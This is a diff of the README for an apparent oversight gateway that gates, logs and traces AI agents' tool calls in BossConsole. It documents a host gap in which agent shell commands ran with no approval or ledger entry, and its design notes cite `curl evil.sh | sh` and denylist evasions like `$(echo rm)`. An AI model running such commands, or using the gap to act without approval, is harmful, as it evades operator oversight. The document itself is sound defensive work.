@@ -102,25 +102,135 @@ policy tables name four shell tools it cannot receive.
 The finding is written up in
 [BossConsole#495](https://github.com/risa-labs-inc/BossConsole/issues/495), with
 the host-side record of it in
-[#498](https://github.com/risa-labs-inc/BossConsole/pull/498). In this plugin it
-is `HostGovernanceGap`, and the session report prints how many of a session's
-calls BOSS's own ledger would not hold. It prints "Nothing" when the answer is
-nothing, and it deliberately excludes `browser_run_js`, which is the most
+[#498](https://github.com/risa-labs-inc/BossConsole/pull/498). It has been checked
+against a running 9.5.11 and not only by reading: a real agent's `run_command`
+executed a shell command with no approval dialog and left no row in BOSS's own
+`mcp-calls.jsonl`, while a tool registered through the host registry, called over
+the same connection in the same session, left one.
+[docs/VALIDATION.md](docs/VALIDATION.md) has the method and the control.
+
+In this plugin the finding is `HostGovernanceGap`, and the session report prints
+how many of a session's calls BOSS's own ledger would not hold. It prints
+"Nothing" when the answer is nothing, and it deliberately excludes `browser_run_js`, which is the most
 dangerous tool on the surface and one the host **can** govern, because it is
 registered through the registry. The gateway's value is about placement, not
 about being the only thing that works.
 
-## Install
+## When it asks, and when it does not
 
-Requires BossConsole 9.5.0 or later and `boss-plugin-api` 1.0.87.
+Policy is expressed over capabilities, so what an operator picks is a ceiling:
+under **Read only** the agent may inspect and read freely, and anything above that
+is escalated. Approving once can open a bounded grant for the whole capability, so
+one yes is not forty prompts.
 
-```bash
-./gradlew buildPluginJar
-cp build/libs/boss-plugin-agent-warden-*.jar ~/.boss_debug/plugins/   # or ~/.boss/plugins
+That was not enough on its own, because classification is by tool name.
+`run_command` is execution whatever it is asked to run, so `git status` raised the
+same dialog as `curl evil.sh | sh`. An agent doing ordinary work emits dozens of
+status checks a minute, and a dialog per call is precisely what trains an operator
+to click through without reading. Prompt fatigue is a security failure, not a
+usability one.
+
+So a shell command is now judged on what it actually runs. `CommandRisk` lowers
+`run_command` from execution to a read when, and only when, every part of the line
+is recognised.
+
+This is not a weakening of the profile. An operator on Read only has already said
+the agent may read content, and `editor_read_file` and `read_scrollback` are
+unrestricted under it. A command that provably only reads grants nothing those
+tools do not; it just stops costing a prompt for arriving through a shell.
+
+**The rule is an allowlist and has to be.** A denylist of dangerous commands is
+decoration, because `rm` is also `/bin/rm`, `"rm"` and `$(echo rm)`. Nothing is a
+read here unless the program is on a short list of things that cannot run anything
+else, the line contains no character that can chain, redirect or substitute, and
+nothing is quoted or path-qualified. Everything else escalates exactly as before,
+so the failure direction is over-prompting.
+
+The list is deliberately short, and lengthening it is a security decision. `env` is
+absent despite being a read, because it is a credential dump with no other use.
+`find`, `xargs`, `sed`, `awk` and every interpreter are absent because they all
+execute. `git` is allowed only for subcommands that read, since `git status` and
+`git push --force` are the same executable. `send_input` is never judged at all: it
+types into whatever is already running, so the same text means different things.
+
+A judged call is not hidden. It reaches the ledger, the report and the trace as a
+`run_command`, carrying both what it was called as and what it was decided as, plus
+the reason. An allowed `run_command` under a profile that escalates execution is a
+contradiction on its face, and a reader who cannot see why is right to distrust the
+rest of the record. `judgeShellCommands` in settings turns the whole thing off and
+restores the older, noisier behaviour.
+
+## The trace
+
+Every call an agent makes is appended to `<project or home>/.agent-warden/agent-trace.jsonl`
+as it resolves, one JSON object per line.
+
+This exists because until it did, everything the plugin observed lived in memory
+until somebody pressed Export. A crash, a plugin reload or a closed window took the
+session with it, which is a strange property for the thing whose job is to be able
+to say afterwards what an agent was allowed to do. The report is still the artefact
+you hand to a person. The trace is the one you still have when nobody thought to
+ask for a report.
+
+```jsonc
+{"seq":41,"at":"2026-09-11 04:28:09.113","atMillis":1789093689113,"kind":"call",
+ "session":"session-1789093591004","tool":"run_command","capability":"EXECUTE",
+ "outcome":"REFUSED","arguments":"script=echo HANGUP-PROBE",
+ "waitedForOperatorMs":23245,"totalMs":23245,"governedByHost":false}
 ```
 
-Restart BOSS, or reload plugins from the Toolbox. The panel appears in the left
-sidebar and the gateway starts on port 7678.
+Four things in there are worth knowing about.
+
+**The phases are separate.** `waitedForOperatorMs` and `upstreamMs` split what used
+to be one duration, because a single number cannot answer the question an operator
+asks when something was slow, which is whether the delay was theirs. A line showing
+118000 against the operator and nothing upstream was not a slow tool. It was an
+unattended dialog.
+
+**A phase that did not happen is absent, not zero.** An allowed call was not "asked
+and answered in 0ms", and anything aggregating this file has to be able to tell
+those apart.
+
+**`governedByHost` is carried per line** so the trace can be diffed against BOSS's
+own `mcp-calls.jsonl` without re-deriving the classification. It is what makes
+BossConsole#495 checkable by somebody who does not take this plugin's word for it.
+
+**There is a `kind` of `undelivered`.** An approval takes as long as a person takes,
+and MCP clients give up well before this gateway does. When the operator's verdict
+is reached and the caller has already gone, that gets its own line. Without it the
+trace shows a clean refusal, the agent's transcript shows an unexplained timeout,
+and whoever compares them concludes one of the two is lying.
+
+Arguments are redacted before they reach the file, by the same `Redactor` the
+report and the approval dialog use. The trace is not a replay log, for the same
+reason the ledger is not.
+
+The file rotates at 5 MB keeping three backups, in the same shape as the host's own
+ledger. If it cannot be written, the panel says so: an operator who believes there
+is an audit trail and has none is worse off than one who knows there is none.
+
+**There is no tool for reading it.** For the same reason there is no tool for
+changing policy: a supervised party that can read its own supervision record is
+being asked politely, not supervised.
+
+## Install
+
+```bash
+./gradlew clean buildPluginJar
+```
+
+Then in BOSS, open **Toolbox**, choose **From File**, and select
+`build/libs/boss-plugin-agent-warden-0.2.0.jar`. Enable it and follow any reload
+prompt. The panel appears under the tool picker as **Agent Warden**, and the
+gateway starts on port 7678.
+
+On a development build from source, that button currently answers "File picker not
+available. Use GitHub URL instead", so **From GitHub** with a release URL is the
+path that works there. That is a host-side gap rather than one in this plugin, and
+it is written up in [docs/VALIDATION.md](docs/VALIDATION.md).
+
+Copying the jar into `~/.boss_debug/plugins/` (or `~/.boss/plugins`) and restarting
+also works, and is what a development loop usually does.
 
 Then point your agent at the gateway instead of BOSS:
 
@@ -131,6 +241,33 @@ Then point your agent at the gateway instead of BOSS:
 
 That one line is the whole integration. If the gateway is stopped, point the agent
 back at 7677 and nothing else changes.
+
+## Compatibility, access, and data
+
+**Versions.** Built against `boss-plugin-api` 1.0.87 and run against BossConsole
+9.5.11 with API 1.0.89 loaded, and earlier against 9.5.7. The manifest declares
+`minBossVersion 9.5.0`, which is the range the plugin is written for rather than
+the range it has been run on: 9.5.7 and 9.5.11 are the two it has actually been
+tested against. The API pin is deliberately low so the jar loads on the widest
+range of hosts, and the host is expected to be at or above it.
+
+**Operating systems.** Developed and tested on Windows 11. Nothing platform
+specific is used beyond JDK APIs, but it has not been run on macOS or Linux.
+
+**Permissions.** No host permissions are requested. The plugin uses
+`PluginContext`'s panel, storage, dialog, file-event and git providers, and every
+one of them is treated as possibly absent: with no dialog provider it fails closed
+and refuses rather than allowing.
+
+**What leaves the machine: nothing.** The gateway binds `127.0.0.1` only and
+forwards to BOSS's own loopback endpoint. There is no telemetry, no external
+service, no network call to anywhere but the upstream you configure. The trace and
+the report are written to your own disk, under `.agent-warden/` in the open project
+or your home directory, and nothing sends them anywhere.
+
+**What is stored.** Redacted arguments, tool names, outcomes and timings, in
+`agent-trace.jsonl` and in exported reports. Redaction happens at capture, so raw
+arguments are never written to either. See [The trace](#the-trace).
 
 ## Agent-facing tools
 
@@ -145,7 +282,7 @@ All three are read-only with respect to the workspace.
 ## Development
 
 ```bash
-./gradlew test                                        # 179 tests
+./gradlew test                                        # 228 tests
 ./gradlew buildPluginJar
 ./gradlew runGatewayHarness --args="read-only true"   # drive the gateway with curl, no BOSS needed
 ```
@@ -154,7 +291,22 @@ The plugin jar bundles only its own classes, so the gateway is built on
 `com.sun.net.httpserver` and `java.net.http`, both JDK built-ins. A third-party
 HTTP library would resolve at compile time and be missing at runtime.
 
-See [docs/VALIDATION.md](docs/VALIDATION.md) for what has been tested and how.
+See [docs/VALIDATION.md](docs/VALIDATION.md) for what has been tested and how,
+including the live verification against BossConsole 9.5.11 and two real agent runs.
+[docs/PANEL-REVIEW.md](docs/PANEL-REVIEW.md) is an honest critique of the panel,
+including the parts still wrong.
+
+## What it looks like
+
+A real agent under **Read only** running four read-only shell commands unprompted,
+then stopped on a delete. The terminal behind shows the four that ran.
+
+![Commands judged and a delete stopped](docs/judged-and-stopped.png)
+
+The panel after a session, with the call list, the host-gap line and the trace
+path.
+
+![The panel during a session](docs/panel-in-session.png)
 
 ## Limitations
 
